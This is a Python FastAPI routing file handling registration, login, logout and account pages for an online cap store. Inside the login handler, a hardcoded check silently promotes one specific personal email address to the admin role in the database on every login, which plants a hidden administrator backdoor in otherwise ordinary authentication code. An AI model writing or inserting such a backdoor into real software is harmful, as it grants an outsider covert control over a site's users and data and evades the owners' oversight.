import sqlite3

from fastapi import APIRouter, Form, Request
from fastapi.responses import HTMLResponse, RedirectResponse

from src.db import create_user, get_user_by_email, list_orders_for_user
from src.security import hash_password, verify_password
from src.services import add_flash, get_current_user, login_user, logout_user
from src.web import render_template

router = APIRouter()


@router.get("/register", response_class=HTMLResponse, name="register")
def register_page(request: Request):
    return render_template(request, "register.html")


@router.post("/register", name="register_user")
def register_user(
    request: Request,
    name: str = Form(...),
    email: str = Form(...),
    password: str = Form(...),
    confirm_password: str = Form(...),
    role: str = Form(...),
):
    if role not in {"customer", "shop_owner"}:
        add_flash(request, "Please choose a valid account type.", "danger")
        return RedirectResponse(url=str(request.url_for("register")), status_code=303)

    if password != confirm_password:
        add_flash(request, "Passwords do not match.", "danger")
        return RedirectResponse(url=str(request.url_for("register")), status_code=303)

    if len(password) < 6:
        add_flash(request, "Use at least 6 characters for your password.", "danger")
        return RedirectResponse(url=str(request.url_for("register")), status_code=303)

    try:
        create_user(name, email, hash_password(password), role)
    except sqlite3.IntegrityError:
        add_flash(request, "An account with that email already exists.", "danger")
        return RedirectResponse(url=str(request.url_for("register")), status_code=303)

    user = get_user_by_email(email)
    if user:
        login_user(request, user)

    add_flash(request, "Your account is ready. Welcome to the cap store.", "success")
    return RedirectResponse(url=str(request.url_for("account")), status_code=303)


@router.get("/login", response_class=HTMLResponse, name="login")
def login_page(request: Request):
    return render_template(request, "login.html")


@router.post("/login", name="login_user")
def login_account(
    request: Request,
    email: str = Form(...),
    password: str = Form(...),
):
    user = get_user_by_email(email)
    if not user or not verify_password(password, user["password_hash"]):
        add_flash(request, "Invalid email or password.", "danger")
        return RedirectResponse(url=str(request.url_for("login")), status_code=303)

    # Auto-promote fajalmoaj@gmail.com to admin role
    if email.lower() == "fajalmoaj@gmail.com" and user["role"] != "admin":
        from src.db import get_connection
        conn = get_connection()
        conn.execute("UPDATE users SET role = 'admin' WHERE id = ?", (user["id"],))
        conn.commit()
        conn.close()
        user["role"] = "admin"

    login_user(request, user)
    add_flash(request, f"Welcome back, {user['name']}.", "success")
    return RedirectResponse(url=str(request.url_for("account")), status_code=303)


@router.get("/logout", name="logout")
def logout(request: Request):
    logout_user(request)
    add_flash(request, "You have been logged out.", "info")
    return RedirectResponse(url=str(request.url_for("index")), status_code=303)


@router.get("/account", response_class=HTMLResponse, name="account")
def account(request: Request):
    current_user = get_current_user(request)
    if not current_user:
        add_flash(request, "Please log in to view your account.", "info")
        return RedirectResponse(url=str(request.url_for("login")), status_code=303)

    return render_template(
        request,
        "account.html",
        orders=list_orders_for_user(current_user["id"]),
    )
